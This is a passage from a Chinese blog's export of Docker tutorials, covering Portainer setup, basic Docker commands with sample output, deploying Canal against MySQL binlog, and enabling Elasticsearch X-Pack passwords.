端口，第一次登录设置管理员账号和密码 # docker 连接管理 可以选择管理本地 Local 和远程 Remote 的 Docker 两个选项，我们安装在本机，直接选择 Local，然后 Connect 进入管理界面 点击 connect，报错 Failure dial unix /var/run/docker.sock: connect: permission denied 可以猜测是 SElinux 的问题，看 SELinux 状态：sestatus 命令进行查看 12/usr/sbin/sestatus -v ##如果SELinux status参数为enabled即为开启状态SELinux status: enabled 修改 /etc/selinux/config 文件，保存后重启机器 将 SELINUX=enforcing 改为 SELINUX=disabled 再次访问 9000，连接 local，成功 # 四、补充 # docker 开机自启 1sudo systemctl enable docker # 容器开机自启 以上面的 docker 可视化管理工具 portainer 为例，希望开机的时候，自动启动镜像 启动命令加–restart=always 1docker run -p 9000:9000 --name portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -d portainer/portainer 如果已经在运行的镜像 1docker update --restart=always portainer # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2023/02/24/%E3%80%90Docker%E3%80%91Linux%E9%83%A8%E7%BD%B2Docker/"},{"title":"Docker的基础用法","text":"# 1 Docker 架构 镜像 (Image)：Docker 镜像 (Image)，就相当于是 一个 root 文件系统。比如官方镜像 ubuntu:16.04 就包 含了完整的一套 Ubuntu16.04 最小系统的 root 文件系统。 容器 (Container)：镜像 (Image) 和容器 (Contain er) 的关系，就像是面向对象程序设计中的类和对象一 样，镜像是静态的定义，容器是镜像运行时的实体。容 器可以被创建、启动、停止、删除、暂停等。 仓库 (Repository)：仓库可看成一个代码控制中心， 用来保存镜像 # 2 Docker 镜像与镜像仓库 在 docker 中仓库的名字是以应用的名称取名的。 镜像是静态的，而容器是动态的，容器有其生命周期，镜像与容器的关系类似于程序与进程的关系。镜像类似于文件系统中的程序文件，而容器则类似于将一个程序运行起来的状态，也即进程。所以容器是可以删除的，容器被删除后其镜像是不会被删除的。 # 3 Docker 对象 When you use docker, you are creating and using images, containers, networks, volumes, pluginns, and other objects.(当你使用 docker 时，你正在创建和使用镜像、容器、网络、卷、插件和其他对象) IMAGES (镜像) An image is a read-only template with instructions for creating a docker container.(镜像是一个只读模板，它带有创建 docker 容器的指令。) Often, an image is based on another image, with some additional customization.(通常，一个镜像基于另一个镜像，并带有一些额外的自定义。) You might create your own images or you might only use those created by others and published in a registry.(您可以创建自己的镜像，也可以使用其他人创建并在仓库中发布的镜像。) CONTAINERS (容器) A conntainer is a runnable instance of an image.(容器是镜像的可运行实例。) You can create, run, stop, move, or delete a container using the docker API or CLI.(您可以通过 docker API 或 CLI 创建、运行、停止、移动或删除容器。) You can connect a container to one or more networks, attach storage to it, or even create a new image based on its current state.(您可以将容器连接到一个或多个网络，为其附加存储，甚至可以根据其当前状态创建新镜像。) # 4 Docker 安装及使用 4.1 Docker 安装 12345[root@Docker ~]# wget -O /etc/yum.repos.d/docker-ce.repo https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/centos/docker-ce.repo[root@Docker ~]# sed -i 's@https://download.docker.com@https://mirrors.tuna.tsinghua.edu.cn/docker-ce@g' /etc/yum.repos.d/docker-ce.repo[root@Docker ~]# yum clean all21 文件已删除[root@Docker ~]# yum -y install docker-ce # 4.2 Docker 加速 为什么需要加速器？因为 docker 在拉取镜像时，是去国外拉取的所以会比较慢，使用加速器可以解决这个问题 docker-ce 的配置文件是 /etc/docker/daemon.json，此文件默认不存在，需要我们手动创建并进行配置，而 docker 的加速就是通过配置此文件来实现的 # docker 的加速有多种方式 docker cn 中国科技大学加速器 阿里云加速器（需要通过阿里云开发者平台注册帐号，免费使用个人私有的加速器） 12345678910[root@Docker ~]# systemctl enable --now docker //启动docker服务Created symlink /etc/systemd/system/multi-user.target.wants/docker.service → /usr/lib/systemd/system/docker.service.[root@Docker ~]# cat &gt; /etc/docker/daemon.json &lt;&lt;EOF{ &quot;registry-mirrors&quot;: [&quot;https://xj3hc284.mirror.aliyuncs.com&quot;]}EOF[root@Docker ~]# systemctl daemon-reload[root@Docker ~]# systemctl restart docker //重启docker服务 # 4.3 Docker 常用操作 # 4.3.1 docker version (查看版本号) 1234567891011121314151617181920212223242526272829[root@Docker ~]# docker versionClient: Docker Engine - Community //docker客户端版本 Version: 20.10.11 API version: 1.41 Go version: go1.16.9 Git commit: dea9396 Built: Thu Nov 18 00:36:58 2021 OS/Arch: linux/amd64 Context: default Experimental: trueServer: Docker Engine - Community //docker服务端版本 Engine: Version: 20.10.11 API version: 1.41 (minimum version 1.12) Go version: go1.16.9 Git commit: 847da18 Built: Thu Nov 18 00:35:20 2021 OS/Arch: linux/amd64 Experimental: false containerd: //容器版本 Version: 1.4.12 GitCommit: 7b11cfaabd73bb80907dd23182b9347b4245eb5d runc: Version: 1.0.2 GitCommit: v1.0.2-0-g52b36a2 docker-init: //docker初始化版本 Version: 0.19.0 GitCommit: de40ad0 # 4.3.2 docker info (显示整个系统的信息) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556[root@Docker ~]# docker infoClient: #docker客户端版本信息 Context: default #上下文 Debug Mode: false Plugins: #插件 app: Docker App (Docker Inc., v0.9.1-beta3) buildx: Build with BuildKit (Docker Inc., v0.6.3-docker) scan: Docker Scan (Docker Inc., v0.9.0)Server: #docker服务端版本信息 Containers: 0 #容器个数 Running: 0 #运行个数 Paused: 0 #暂停状态个数 Stopped: 0 #停止状态个数 Images: 0 #镜像个数 Server Version: 20.10.11 #服务版本号 Storage Driver: overlay2 #存储驱动 Backing Filesystem: xfs #后端文件系统 Supports d_type: true Native Overlay Diff: true userxattr: false Logging Driver: json-file # 日志驱动 Cgroup Driver: cgroupfs Cgroup Version: 1 Plugins: # 插件 Volume: local Network: bridge host ipvlan macvlan null overlay Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog Swarm: inactive Runtimes: io.containerd.runc.v2 io.containerd.runtime.v1.linux runc Default Runtime: runc Init Binary: docker-init containerd version: 7b11cfaabd73bb80907dd23182b9347b4245eb5d runc version: v1.0.2-0-g52b36a2 init version: de40ad0 Security Options: # 安全选项 seccomp Profile: default Kernel Version: 4.18.0-257.el8.x86_64 # 内核版本号 Operating System: CentOS Stream 8 # 操作系统 OSType: linux #操作系统 类型 Architecture: x86_64 #架构 CPUs: 4 # CPU核心数 Total Memory: 7.559GiB #总内存 Name: Docker ID: 4MEZ:OEWB:CPHP:3PYE:54J3:46XO:B5CX:JHYB:OW5Q:TWJP:PWHO:JJSM Docker Root Dir: /var/lib/docker #docker默认目录 Debug Mode: false Registry: https://index.docker.io/v1/ # 仓库地址 Labels: #标签 Experimental: false Insecure Registries: 127.0.0.0/8 Registry Mirrors: #加速器 https://xj3hc284.mirror.aliyuncs.com/ Live Restore Enabled: false # 4.3.3 docker search (在 docker hub 中搜索镜像) 123456789101112131415161718192021222324252627[root@Docker ~]# docker search nginxNAME DESCRIPTION STARS OFFICIAL AUTOMATEDnginx Official build of Nginx. 15893 [OK] jwilder/nginx-proxy Automated Nginx reverse proxy for docker con… 2098 [OK]richarvey/nginx-php-fpm Container running Nginx + PHP-FPM capable of… 819 [OK]jc21/nginx-proxy-manager Docker container for managing Nginx proxy ho… 285 linuxserver/nginx An Nginx container, brought to you by LinuxS… 160 tiangolo/nginx-rtmp Docker image with Nginx using the nginx-rtmp… 146 [OK]jlesage/nginx-proxy-manager Docker container for Nginx Proxy Manager 144 [OK]alfg/nginx-rtmp NGINX, nginx-rtmp-module and FFmpeg from sou… 110 [OK]nginxdemos/hello NGINX webserver that serves a simple page co… 79 [OK]privatebin/nginx-fpm-alpine PrivateBin running on an Nginx, php-fpm &amp; Al… 60 [OK]nginx/nginx-ingress NGINX and NGINX Plus Ingress Controllers fo… 57 nginxinc/nginx-unprivileged Unprivileged NGINX Dockerfiles 54 nginxproxy/nginx-proxy Automated Nginx reverse proxy for docker con… 28 staticfloat/nginx-certbot Opinionated setup for automatic TLS certs lo… 25 [OK]nginx/nginx-prometheus-exporter NGINX Prometheus Exporter for NGINX and NGIN… 22 schmunk42/nginx-redirect A very simple container to redirect HTTP tra… 19 [OK]centos/nginx-112-centos7 Platform for running nginx 1.12 or building … 16 centos/nginx-18-centos7 Platform for running nginx 1.8 or building n… 13 flashspys/nginx-static Super Lightweight Nginx Image 11 [OK]bitwarden/nginx The Bitwarden nginx web server acting as a r… 11 mailu/nginx Mailu nginx frontend 9 [OK]sophos/nginx-vts-exporter Simple server that scrapes Nginx vts stats a… 7 [OK]ansibleplaybookbundle/nginx-apb An APB to deploy NGINX 3 [OK]arnau/nginx-gate Docker image with Nginx with Lua enabled on … 1 [OK]wodby/nginx Generic nginx 1 [OK] # 4.3.4 docker pull (拉取镜像) 123456789101112[root@Docker ~]# docker pull nginxUsing default tag: latestlatest: Pulling from library/nginxeff15d958d66: Pull complete 1e5351450a59: Pull complete 2df63e6ce2be: Pull complete 9171c7ae368c: Pull complete 020f975acd28: Pull complete 266f639b35ad: Pull complete Digest: sha256:097c3a0913d7e3a5b01b6c685a60c03632fc7a2b50bc8e35bcaa3691d788226eStatus: Downloaded newer image for nginx:latestdocker.io/library/nginx:latest # 4.3.5 docker images (列出系统当前镜像) 123[root@Docker ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEnginx latest ea335eea17ab 13 days ago 141MB # 4.3.6 docker image history (查看指定镜像的历史) 1234567891011121314151617[root@Docker ~]# docker image history nginxIMAGE CREATED CREATED BY SIZE COMMENTea335eea17ab 13 days ago /bin/sh -c #(nop) CMD [&quot;nginx&quot; &quot;-g&quot; &quot;daemon… 0B &lt;missing&gt; 13 days ago /bin/sh -c #(nop) STOPSIGNAL SIGQUIT 0B &lt;missing&gt; 13 days ago /bin/sh -c #(nop) EXPOSE 80 0B &lt;missing&gt; 13 days ago /bin/sh -c #(nop) ENTRYPOINT [&quot;/docker-entr… 0B &lt;missing&gt; 13 days ago /bin/sh -c #(nop) COPY file:09a214a3e07c919a… 4.61kB &lt;missing&gt; 13 days ago /bin/sh -c #(nop) COPY file:0fd5fca330dcd6a7… 1.04kB &lt;missing&gt; 13 days ago /bin/sh -c #(nop) COPY file:0b866ff3fc1ef5b0… 1.96kB &lt;missing&gt; 13 days ago /bin/sh -c #(nop) COPY file:65504f71f5855ca0… 1.2kB &lt;missing&gt; 13 days ago /bin/sh -c set -x &amp;&amp; addgroup --system -… 61.1MB &lt;missing&gt; 13 days ago /bin/sh -c #(nop) ENV PKG_RELEASE=1~bullseye 0B &lt;missing&gt; 13 days ago /bin/sh -c #(nop) ENV NJS_VERSION=0.7.0 0B &lt;missing&gt; 13 days ago /bin/sh -c #(nop) ENV NGINX_VERSION=1.21.4 0B &lt;missing&gt; 13 days ago /bin/sh -c #(nop) LABEL maintainer=NGINX Do… 0B &lt;missing&gt; 2 weeks ago /bin/sh -c #(nop) CMD [&quot;bash&quot;] 0B &lt;missing&gt; 2 weeks ago /bin/sh -c #(nop) ADD file:a2405ebb9892d98be… 80.4MB # 4.3.7 docker image inspect (查看指定镜像的详细信息) 123456789101112131415161718192021222324[root@Docker ~]# docker image inspect nginx[ { &quot;Id&quot;: &quot;sha256:ea335eea17ab984571cd4a3bcf90a0413773b559c75ef4cda07d0ce952b00291&quot;, &quot;RepoTags&quot;: [ &quot;nginx:latest&quot; ], &quot;RepoDigests&quot;: [ &quot;nginx@sha256:097c3a0913d7e3a5b01b6c685a60c03632fc7a2b50bc8e35bcaa3691d788226e&quot; ], &quot;Parent&quot;: &quot;&quot;, &quot;Comment&quot;: &quot;&quot;, &quot;Created&quot;: &quot;2021-11-17T10:38:14.652464384Z&quot;, &quot;Container&quot;: &quot;8a038ff17987cf87d4b7d7e2c80cb83bd2474d66e2dd0719e2b4f7de2ad6d853&quot;, &quot;ContainerConfig&quot;: { &quot;Hostname&quot;: &quot;8a038ff17987&quot;, &quot;Domainname&quot;: &quot;&quot;, &quot;User&quot;: &quot;&quot;, &quot;AttachStdin&quot;: false, &quot;AttachStdout&quot;: false, &quot;AttachStderr&quot;: false, &quot;ExposedPorts&quot;: { &quot;80/tcp&quot;: {} }, # 4.3.8 删除镜像 1234567891011121314151617181920[root@Docker ~]# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES8442117bc0c7 nginx &quot;/docker-entrypoint.…&quot; 57 minutes ago Exited (0) 6 minutes ago youthful_euclid[root@Docker ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEhttpd latest ad17c88403e2 12 days ago 143MBnginx latest ea335eea17ab 13 days ago 141MB[root@Docker ~]# docker rmi ad17c88403e2Untagged: httpd:latestUntagged: httpd@sha256:1d71eef54c08435c0be99877c408637f03112dc9f929fba3cccdd15896099b02Deleted: sha256:ad17c88403e2cedd27963b98be7f04bd3f903dfa7490586de397d0404424936dDeleted: sha256:a59e7dfeeb485a8a45b1fcce812b10fbd955d304fa2e9ca43b10b16a8ee1afb8Deleted: sha256:9592080464aa1890ed187c42a13ecc9f175e975a96a3fad28df0559ad0c08b9dDeleted: sha256:42d2debfa0c419f7f89affa3e9b62d1b7e54dc6654dbd186d4654ee3661c44c8Deleted: sha256:136822c50a75392f4ce06461fa4894aa7d1e060ec0dd4782e13e2d9829df50a3[root@Docker ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEnginx latest ea335eea17ab 13 days ago 141MB # 4.3.9 docker create (创建容器) 此命令只会创建容器，而不会运行容器 12[root@Docker ~]# docker create nginx8442117bc0c7b85609a77229433413a85ac0fa951fe9c0efc3c340b1299fbd74 # 4.3.10 docker ps (列出容器) 123456[root@Docker ~]# docker ps //查看正在运行的容器CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES[root@Docker ~]# docker ps -a //查看所有容器CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES8442117bc0c7 nginx &quot;/docker-entrypoint.…&quot; 3 minutes ago Created youthful_euclid # 4.3.11 docker start (启动容器) 123456[root@Docker ~]# docker start 8442117bc0c7 #启动容器，后面接容器的ID号，ID号可以简写8442117bc0c7[root@Docker ~]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES8442117bc0c7 nginx &quot;/docker-entrypoint.…&quot; 8 minutes ago Up 14 seconds 80/tcp youthful_euclid # 4.3.12 docker attach (进入容器) 在当前 shell 下 attach 连接指定运行镜像，以这种方式进入容器，此时容器会一直占用前台，如果退出容器，容器就会停止 12345678[root@Docker ~]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES8442117bc0c7 nginx &quot;/docker-entrypoint.…&quot; 50 minutes ago Up 30 seconds 80/tcp youthful_euclid[root@Docker ~]# docker attach 8442117bc0c7[root@Docker ~]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES # 4.3.13 docker exec (进入容器) 用这个命令进入容器后台运行就算是退出了容器，容器也不会停止运行 12345678910111213[root@Docker ~]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES8442117bc0c7 nginx &quot;/docker-entrypoint.…&quot; 26 minutes ago Up 3 seconds 80/tcp youthful_euclid[root@Docker ~]# docker exec -it 8442117bc0c7 /bin/bashroot@8442117bc0c7:/# lsbin boot dev docker-entrypoint.d docker-entrypoint.sh etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr varroot@8442117bc0c7:/# exitexit[root@Docker ~]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES8442117bc0c7 nginx &quot;/docker-entrypoint.…&quot; 27 minutes ago Up 23 seconds 80/tcp youthful_euclid # 4.3.14 docker inspect (查看容器的信息详细) 通过查看详细信息可以查看其容器的 IP 地址 12345678910111213141516171819202122232425[root@Docker ~]# docker inspect 8442117bc0c7[ { &quot;Id&quot;: &quot;8442117bc0c7b85609a77229433413a85ac0fa951fe9c0efc3c340b1299fbd74&quot;, &quot;Created&quot;: &quot;2021-12-01T07:28:48.929261547Z&quot;, &quot;Path&quot;: &quot;/docker-entrypoint.sh&quot;, &quot;Args&quot;: [ &quot;nginx&quot;, &quot;-g&quot;, &quot;daemon off;&quot; ], &quot;State&quot;: { &quot;Status&quot;: &quot;running&quot;, &quot;Running&quot;: true, &quot;Paused&quot;: false, &quot;Restarting&quot;: false, &quot;OOMKilled&quot;: false, &quot;Dead&quot;: false, &quot;Pid&quot;: 5390, &quot;ExitCode&quot;: 0, &quot;Error&quot;: &quot;&quot;, &quot;StartedAt&quot;: &quot;2021-12-01T07:36:41.636489391Z&quot;, &quot;FinishedAt&quot;: &quot;0001-01-01T00:00:00Z&quot; },...... # 4.3.15 docker logs (查看容器日志) 123456789101112131415161718192021222324[root@Docker ~]# docker logs 8442117bc0c7/docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration/docker-entrypoint.sh: Looking for shell scripts in /docker-entrypoint.d//docker-entrypoint.sh: Launching /docker-entrypoint.d/10-listen-on-ipv6-by-default.sh10-listen-on-ipv6-by-default.sh: info: Getting the checksum of /etc/nginx/conf.d/default.conf10-listen-on-ipv6-by-default.sh: info: Enabled listen on IPv6 in /etc/nginx/conf.d/default.conf/docker-entrypoint.sh: Launching /docker-entrypoint.d/20-envsubst-on-templates.sh/docker-entrypoint.sh: Launching /docker-entrypoint.d/30-tune-worker-processes.sh/docker-entrypoint.sh: Configuration complete; ready for start up2021/12/01 07:36:41 [notice] 1#1: using the &quot;epoll&quot; event method2021/12/01 07:36:41 [notice] 1#1: nginx/1.21.42021/12/01 07:36:41 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 2021/12/01 07:36:41 [notice] 1#1: OS: Linux 4.18.0-257.el8.x86_642021/12/01 07:36:41 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:10485762021/12/01 07:36:41 [notice] 1#1: start worker processes2021/12/01 07:36:41 [notice] 1#1: start worker process 312021/12/01 07:36:41 [notice] 1#1: start worker process 322021/12/01 07:36:41 [notice] 1#1: start worker process 332021/12/01 07:36:41 [notice] 1#1: start worker process 34172.17.0.1 - - [01/Dec/2021:07:43:23 +0000] &quot;GET / HTTP/1.1&quot; 200 615 &quot;-&quot; &quot;curl/7.61.1&quot; &quot;-&quot;172.17.0.1 - - [01/Dec/2021:07:43:44 +0000] &quot;GET / HTTP/1.1&quot; 200 615 &quot;-&quot; &quot;curl/7.61.1&quot; &quot;-&quot;172.17.0.1 - - [01/Dec/2021:07:43:45 +0000] &quot;GET / HTTP/1.1&quot; 200 615 &quot;-&quot; &quot;curl/7.61.1&quot; &quot;-&quot;172.17.0.1 - - [01/Dec/2021:07:43:46 +0000] &quot;GET / HTTP/1.1&quot; 200 615 &quot;-&quot; &quot;curl/7.61.1&quot; &quot;-&quot;172.17.0.1 - - [01/Dec/2021:07:43:46 +0000] &quot;GET / HTTP/1.1&quot; 200 615 &quot;-&quot; &quot;curl/7.61.1&quot; &quot;-&quot; # 4.3.16 docker stop (停止容器) 12345678910111213[root@Docker ~]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES8442117bc0c7 nginx &quot;/docker-entrypoint.…&quot; 16 minutes ago Up 8 minutes 80/tcp youthful_euclid[root@Docker ~]# docker stop 8442117bc0c78442117bc0c7[root@Docker ~]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES[root@Docker ~]# docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES8442117bc0c7 nginx &quot;/docker-entrypoint.…&quot; 16 minutes ago Exited (0) 5 seconds ago youthful_euclid # 4.3.17 docker restart (重启容器) 12345678910111213[root@Docker ~]# docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES8442117bc0c7 nginx &quot;/docker-entrypoint.…&quot; 17 minutes ago Exited (0) 46 seconds ago youthful_euclid[root@Docker ~]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES[root@Docker ~]# docker restart 8442117bc0c78442117bc0c7[root@Docker ~]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES8442117bc0c7 nginx &quot;/docker-entrypoint.…&quot; 17 minutes ago Up 3 seconds 80/tcp youthful_euclid # 4.3.18 docker kill (杀死正在运行的容器) 12345678910111213[root@Docker ~]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES8442117bc0c7 nginx &quot;/docker-entrypoint.…&quot; 20 minutes ago Up 2 minutes 80/tcp youthful_euclid[root@Docker ~]# docker kill 8442117bc0c7 8442117bc0c7[root@Docker ~]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES[root@Docker ~]# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES8442117bc0c7 nginx &quot;/docker-entrypoint.…&quot; 20 minutes ago Exited (137) 4 seconds ago youthful_euclid # 4.3.19 docker run (创建并启动容器) 此命令会做三件事情，首先先查看本地是否都对应的镜像，如果没有就拉取，然后创建容器，然后运行容器 12345678910111213141516[root@Docker ~]# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES8442117bc0c7 nginx &quot;/docker-entrypoint.…&quot; 35 minutes ago Exited (0) 5 minutes ago youthful_euclid[root@Docker ~]# docker run -it httpd /bin/bash #此命令的作用是，拉取一个httpd的镜像，然后创建容器并运行，-it表示以交互的方式进入终端，/bin/bash表示终端的环境Unable to find image 'httpd:latest' locallylatest: Pulling from library/httpdeff15d958d66: Already exists ba1caf8ba86c: Pull complete ab86dc02235d: Pull complete 0d58b11d2867: Pull complete e88da7cb925c: Pull complete Digest: sha256:1d71eef54c08435c0be99877c408637f03112dc9f929fba3cccdd15896099b02Status: Downloaded newer image for httpd:latestroot@a01b8d80a160:/usr/local/apache2# lsbin build cgi-bin conf error htdocs icons include logs modules # 4.3.20 docker rm (删除容器) 删除一个或者多个容器，只能删除停止状态的容器或者 - f 强制删除 12345678910111213141516[root@Docker ~]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESa01b8d80a160 httpd &quot;/bin/bash&quot; 10 minutes ago Up 3 seconds 80/tcp hardcore_varahamihira[root@Docker ~]# docker rm a01b8d80a160Error response from daemon: You cannot remove a running container a01b8d80a1609e81d8d8121b3fc3c0f53a676340b3b093b353a7f9bb498fe0e6. Stop the container before attempting removal or force remove[root@Docker ~]# docker rm -f a01b8d80a160a01b8d80a160[root@Docker ~]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES[root@Docker ~]# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES8442117bc0c7 nginx &quot;/docker-entrypoint.…&quot; 48 minutes ago Exited (0) 18 minutes ago youthful_euclid # 5 Docker event state 本文来自 CSDN 原文链接：https://blog.csdn.net/weixin_46727129/article/details/121665668 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/09/28/%E3%80%90Docker%E3%80%91Docker%E7%94%A8%E6%B3%95%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/"},{"title":"【Docker】Docker下安装Canal并整合SpringBoot","text":"# Canal 是一个同步增量数据的一个工具 # 目录 概念 Mysql 开启 binlog 是否开启 binlog 开启 binlog 日志 创建授权用户 部署 Canal 拉取镜像 挂载 properties 配置文件 创建容器 # 概念 canal 是阿里巴巴旗下的一款开源项目，纯 Java 开发。基于数据库增量日志解析，提供增量数据订阅 &amp; 消费，目前主要支持了 MySQL（也支持 mariaDB） # Mysql 开启 binlog 在部署 Canal 之前，需要先安装 Mysql。 我用的是 5.7.27 的 mysql # 是否开启 binlog 输入以下命令，查看是否开启 binlog 为 OFF 则表示未开启 binlog 1show variables like 'log_bin'; # 开启 binlog 日志 修改 mysql 的配置文件，在 [mysqld] 下添加以下内容 123456# server_id不重复即可，不要和canal的slaveId重复server_id=1# 开启binloglog_bin = mysql-bin# 选择row模式binlog_format = ROW 修改完毕，重启 mysql 查看是否开启 # 创建授权用户 创建授权用户 canal 用于 cannal 服务监听 mysql 的 binlog 123456# 新建用户 用户名：canal 密码：canal CREATE USER canal IDENTIFIED by 'canal';# 授权GRANT SELECT, REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO 'canal'@'%';# 刷新MySQL的系统权限相关表FLUSH PRIVILEGES; # 部署 Canal 如果没有部署过 docker，看我之前写的 Linux 部署 Docker # 拉取镜像 1docker pull canal/canal-server:latest # 挂载 properties 配置文件 先进行第一次运行，拷贝 properties 配置文件 1docker run -p 11111:11111 --name canal -d canal/canal-server:latest 拷贝运行后的容器中配置文件，用来文件挂载 123456# 创建canal宿主机挂载目录mkdir -p /opt/canal/conf# 查看docker运行情况，复制容器iddocker ps# 拷贝配置文件docker cp 容器id:/home/admin/canal-server/conf/example/instance.properties /opt/canal/conf/ 移除当前容器 12docker stop canaldocker rm canal 修改配置文件 # 创建容器 运行新的容器，同时挂载修改后的配置文件 1docker run -p 11111:11111 --name canal -v /opt/canal/conf/instance.properties:/home/admin/canal-server/conf/example/instance.properties -d canal/canal-server:latest 开放端口 1firewall-cmd --zone=public --add-port=11111/tcp --permanent &amp;&amp; firewall-cmd --reload # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/02/03/%E3%80%90Docker%E3%80%91Docker%E4%B8%8B%E5%AE%89%E8%A3%85Canal%E5%B9%B6%E6%95%B4%E5%90%88SpringBoot/"},{"title":"docker中设置elasticsearch、kibana用户名密码、修改密码","text":"# docker 中设置 elasticsearch、kibana 用户名密码、修改密码 # 前言 一、elasticsearch 设置密码 首先开启 X-Pack 测试是否设置成功 修改密码 已知密码修改 忘记密码 二、kibana 配置 elasticsearch 密码 # 前言 之前在 docker 中安装过 elasticsearch 和 elasticsearchhead 以及 kibana 都没有配置密码，在此记录下设置过程。 # 一、elasticsearch 设置密码 参考 官方文档 xpack.security.enabled: true 设置引导性密码 The setup-passwords tool is the simplest method to set the built-in users’ passwords for the first time. It uses the elastic user’s bootstrap password to run user management API requests. For example, you can run the command in an “interactive” mode, which prompts you to enter new passwords for the elastic, kibana, and logstash_system users: # 首先开启 X-Pack 修改容器内或者修改挂载出来的 elasticsearch.yml 123docker exec -it elasticsearch /bin/bash # 进入容器内部vi /data/elasticsearch/config/elasticsearch.yml # 挂载目录1 elasticsearch.yml 文件添加 123456cluster.name: &quot;docker-cluster-01&quot;network.host: 0.0.0.0http.cors.enabled: truehttp.cors.allow-origin: &quot;*&quot;# 此处开启xpackxpack.security.enabled: true 重新启动 elasticsearch。 1docker restart elasticsearch 进入 docker 中的 elasticsearch 中，设置密码，执行 1/usr/share/elasticsearch/bin/x-pack/setup-passwords interactive 依次设置用户：elastic、apm_system、kibana_system、logstash_system、beats_system、remote_monitoring_user 共 6 个用户。 内部用户 X-Pack 安全有三个内部用户（_system、_xpack 和_xpack_security），负责在 Elasticsearch 集群中进行的操作。 这些用户仅由源自集群内的请求使用。出于这个原因，它们不能用于对 API 进行身份验证，并且没有密码可以管理或重置。 有时，您可能会在日志中找到对这些用户之一的引用，包括审计日志。 1234567891011121314151617181920212223Initiating the setup of passwords for reserved users elastic,apm_system,kibana,kibana_system,logstash_system,beats_system,remote_monitoring_user.You will be prompted to enter passwords as the process progresses.Please confirm that you would like to continue [y/N]yEnter password for [elastic]: Reenter password for [elastic]: Enter password for [apm_system]: Reenter password for [apm_system]: Enter password for [kibana_system]: Reenter password for [kibana_system]: Enter password for [logstash_system]: Reenter password for [logstash_system]: Enter password for [beats_system]: Reenter password for [beats_system]: Enter password for [remote_monitoring_user]: Reenter password for [remote_monitoring_user]: Changed password for user [apm_system]Changed password for user [kibana_system]Changed password for user [kibana]Changed password for user [logstash_system]Changed password for user [beats_system]Changed password for user [remote_monitoring_user]Changed password for user [elastic]12345678910111213141516171819202122 # 测试是否设置成功 1curl localhost:9200 结果显示： 12[root@VM-24-15-centos config]# curl localhost:9200{&quot;error&quot;:{&quot;root_cause&quot;:[{&quot;type&quot;:&quot;security_exception&quot;,&quot;reason&quot;:&quot;missing authentication credentials for REST request [/]&quot;,&quot;header&quot;:{&quot;WWW-Authenticate&quot;:&quot;Basic realm=\\&quot;security\\&quot; charset=\\&quot;UTF-8\\&quot;&quot;}}],&quot;type&quot;:&quot;security_exception&quot;,&quot;reason&quot;:&quot;missi 显示这个则设置成功。 使用密码访问 elasticsearch 测试是否可以访问。 1curl localhost:9200 -u elastic 就可以看到 elasticsearch 信息。 # 修改密码 # 已知密码修改 1234567POST _xpack/security/user/_passwordPOST _xpack/security/user/&lt;username&gt;/_password# 将用户elastic 密码改为elasticcurl -u elastic -H &quot;Content-Type: application/json&quot; -X POST &quot;localhost:9200/_xpack/security/user/elastic/_password&quot; --data '{&quot;password&quot;:&quot;elastic&quot;}'# 测试是否修改成功curl localhost:9200 -u elastic123456 登录成功的结果展示: 1234567891011121314151617 { &quot;name&quot; : &quot;384cda4775e5&quot;, &quot;cluster_name&quot; : &quot;docker-cluster-01&quot;, &quot;cluster_uuid&quot; : &quot;SOH21TLnQdSZnJq0ZW2iDw&quot;, &quot;version&quot; : { &quot;number&quot; : &quot;7.14.2&quot;, &quot;build_flavor&quot; : &quot;default&quot;, &quot;build_type&quot; : &quot;docker&quot;, &quot;build_hash&quot; : &quot;6bc13727ce758c0e943c3c21653b3da82f627f75&quot;, &quot;build_date&quot; : 